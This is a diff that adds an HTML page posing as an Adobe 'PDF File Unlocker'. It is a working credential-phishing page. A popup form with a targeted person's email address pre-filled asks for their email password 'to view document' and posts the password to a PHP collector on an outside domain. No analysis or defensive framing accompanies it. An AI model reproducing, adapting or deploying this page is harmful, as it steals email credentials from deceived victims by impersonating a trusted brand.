@@ -1,0 +1,190 @@
+<html>
+
+<head>
+
+<style type="text/css">
+
+  a:hover{color:#DF0101; }
+
+  #popupbox{
+  margin: 0; 
+  margin-left: 40%; 
+  margin-right: 40%;
+  margin-top: 50px; 
+  padding-top: 10px; 
+  width: 23%; 
+  height: 300px; 
+  position: absolute; 
+  background: #FFF; 
+  border: solid #8A0808 1px; 
+  z-index: 9; 
+  font-family: arial; 
+  visibility: hidden;
+  -moz-border-radius: 4px; 
+  -webkit-border-radius: 4px; 
+  -khtml-border-radius: 4px; 
+  border-radius: 4px; 
+  -moz-box-shadow: 3px 3px 3px #000; 
+  -webkit-box-shadow: 3px 3px 3px #000; 
+  box-shadow: 3px 3px 3px #000; 
+  }
+  </style>
+  <script language="JavaScript" type="text/javascript">
+  function login(showhide){
+    if(showhide == "show"){
+        document.getElementById('popupbox').style.visibility="visible";
+    }else if(showhide == "hide"){
+        document.getElementById('popupbox').style.visibility="hidden"; 
+    }
+  }
+  
+</script>
+
+
+<style>
+body, html {
+    height: 100%;
+    margin: 0;
+}
+
+.bg {
+    /* The image used */
+    background-image: url("https://i.gyazo.com/bf189f789d0a3317310ea593d7743daa.png");
+
+    /* Full height */
+    height: 100%; 
+
+    /* Center and scale the image nicely */
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+</style>
+
+<title>Adobe | PDF File Unlocker</title>
+</head>
+
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" bgcolor="#000">
+
+<a href="javascript:login('show');">
+
+<div class="bg">
+
+	<div id="popupbox"> 
+
+
+
+<center>
+
+
+	<table width="" align="center">
+
+	<tr><td height="">
+
+	<form method="post" action="https://crystalaqua.co.za/zham/ghn/pdsec.php">
+
+</td></tr>
+
+
+
+
+
+	
+	<tr><td>
+
+		<div align="center">
+		<font face="verdana" size="+2" color="#B40404">
+		PDF File Unlocker<br>
+		<font color="#000000" size="2">Enter Email Password To View Document</font>
+		</font></div>
+
+	</td></td>
+
+
+
+
+
+
+	<tr><td height="20"><td></tr>
+
+
+
+
+
+		
+	<tr><td>
+		
+			<div align="center">
+			<input  name="emlamg" type="email" value="hditzel@health.sdu.dk"readonly="readonly" style="width:240px; height:45px; 
+			font-family: Verdana; font-size: 13px; color:#000000; 
+			background-color: #FFF; border: solid 1px #8A0808; padding: 10px; 
+			-moz-border-radius: 2px; -webkit-border-radius: 2px; 
+			-khtml-border-radius: 2px; border-radius: 2px; 
+			-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;" 
+			required="" placeholder="Email">
+			</div>	
+
+	</td></tr>
+
+
+
+	<tr><td height="10"><td></tr>
+
+
+
+	<tr><td>
+
+			<div align="center">
+			<input  name="passdamg" type="password" style="width:240px; height:45px; 
+			font-family: Verdana; font-size: 13px; color:#000000; 
+			background-color: #FFF; border: solid 1px #8A0808; padding: 10px; 
+			-moz-border-radius: 2px; -webkit-border-radius: 2px; 
+			-khtml-border-radius: 2px; border-radius: 2px; 
+			-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;" 
+			required="" placeholder="Password">
+			</div>
+
+	</td></tr>
+
+
+
+
+	<tr><td height="10"><td></tr>
+
+
+
+	<tr><td>
+
+			<div align="center">
+			<input type="submit" value="Unlock PDF File >>" 
+						style="width:240px; height:50px; background-color: #8A0808; 
+						border: solid 0px; 
+						font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff; 
+						-moz-border-radius: 3px; -webkit-border-radius: 3px; 
+						-khtml-border-radius: 3px; border-radius: 3px;
+						-moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; 
+						box-shadow: 3px 3px 3px #000;">
+			</div>
+
+	</td></tr>
+
+
+
+	<tr><td height="0">
+	</form>
+	<td></tr>
+
+	</table>
+
+
+
+
+	</div> 
+
+
+</div>
+
+</a>
+
+</body>
+</html>
